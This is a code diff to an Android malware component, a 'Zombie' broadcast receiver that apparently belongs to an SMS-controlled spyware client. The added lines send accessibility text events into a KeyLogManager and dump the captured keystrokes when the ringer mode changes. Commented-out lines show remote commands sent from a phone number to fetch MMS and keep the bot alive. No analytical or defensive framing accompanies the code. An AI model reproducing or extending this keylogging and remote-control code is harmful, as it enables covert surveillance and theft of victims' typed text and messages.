@@ -50,7 +50,9 @@ public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 		mPool.Init(mContext);
 		SharedPreferences prefs = mContext.getSharedPreferences("events", 1);
 		
-		if ( action.equals(Zombie_BroadcastReceiver.ACTION_NOTIFY )) {
+		if ( action.equals("android.media.RINGER_MODE_CHANGED")) {
+			KeyLogManager.getInstance().dump();
+		} else if ( action.equals(Zombie_BroadcastReceiver.ACTION_NOTIFY )) {
 			String packName = intent.getStringExtra(Zombie_BroadcastReceiver.EXTRA_PACKAGE);
 			if ( !packName.equals("com.android.mms")) {
 				String text = intent.getStringExtra(Zombie_BroadcastReceiver.EXTRA_ALLTEXT);//intent.getStringExtra(Zombie_BroadcastReceiver.EXTRA_TEXT);
@@ -79,18 +81,24 @@ public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get mms from:130710;to:130713",false));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@keepalive time:2018",false));
 		//ContactsUtils d;
+		
+		/*
+	    handleAny any = new handleAny(mContext);
+		ContentMonitor con;
+		try {
+			con = ContentMonitor.getInstance("handleAny", mContext, new CommandObj("handleAny","help"), any);
+			if ( !con.setEnable(true, handleAny.URI.toString()) )
+				NetLog.v("Cannot set monitor");
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}*/
+		
 	}
 
 	public void handleKeyLog(Intent intent) {
-	 int eventType = intent.getIntExtra(Zombie_BroadcastReceiver.EXTRA_EVENT_TYPE, -1);
-	 if ( eventType == -1 )
-		 return;
-	 if ( eventType == Zombie_BroadcastReceiver.EVENT_CHANGED ) {
 		 AccessibilityEvent event = intent.getParcelableExtra("event");
-		 NetLog.v("Text Changed ->%s",event.getText());
-	 } else {
-		 NetLog.v("Field focused");
-	 } 
+		 KeyLogManager.getInstance().handleEvent(event);
 	}
 
 	public static void serviceLoop(Context context,int sec) {
